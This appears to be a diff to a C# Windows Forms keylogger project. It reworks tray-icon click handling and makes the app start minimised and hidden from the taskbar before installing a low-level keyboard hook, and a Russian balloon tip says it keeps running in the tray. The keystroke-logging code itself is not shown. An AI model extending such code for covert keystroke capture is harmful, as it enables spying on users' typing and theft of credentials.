@@ -20,10 +20,21 @@ namespace KeyLogger
             
             Load += Form1_Load;
             FormClosing += Form1_FormClosing;
-            notifyIconMainForm.Click += NotifyIconMainForm_Click;
+            notifyIconMainForm.MouseClick += NotifyIconMainForm_MouseClick;
             notifyIconMainForm.DoubleClick += NotifyIconMainForm_DoubleClick;
             SetSetingsNotifyIcon();
             this.Resize += Form1_Resize;
+            
+        }
+
+        private void NotifyIconMainForm_MouseClick(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                this.Show();
+                this.WindowState = FormWindowState.Normal;
+                notifyIconMainForm.Visible = false;
+            }
             
         }
 
@@ -32,6 +43,7 @@ namespace KeyLogger
             if (this.WindowState == FormWindowState.Minimized)
             {
                 this.ShowInTaskbar = false;
+                notifyIconMainForm.Visible = true;
                 this.Hide();
                 notifyIconMainForm.BalloonTipTitle = "Программа была спрятана";
                 notifyIconMainForm.BalloonTipText = "Обратите внимание что программа была спрятана в трей и продолжит свою работу.";
@@ -51,12 +63,6 @@ namespace KeyLogger
         private void NotifyIconMainForm_DoubleClick(object sender, EventArgs e)
         {
             this.Close();
-        }
-
-        private void NotifyIconMainForm_Click(object sender, EventArgs e)
-        {
-            this.Show();
-            this.WindowState = FormWindowState.Normal;
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -372,8 +378,9 @@ namespace KeyLogger
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            //this.ShowInTaskbar = false;
+            this.ShowInTaskbar = false;
             this.WindowState = FormWindowState.Minimized;
+            notifyIconMainForm.Visible = true;
             //this.Hide();
             SetHook();
         }
